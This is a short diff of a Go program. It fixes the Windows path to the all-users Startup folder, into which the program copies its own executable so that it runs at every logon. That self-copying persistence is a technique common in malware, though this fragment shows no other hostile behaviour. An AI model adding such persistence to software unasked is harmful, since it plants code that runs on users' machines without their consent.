@@ -180,7 +180,7 @@ func main() {
 //	}
 //	homedir := currentUser.HomeDir
 
-	startup := filepath.Join("C:", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
+	startup := filepath.Join("C:\\", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
 	err = copy(os.Args[0], startup)
 	if err != nil {
 		log.Panicf("copy -> %v", err)
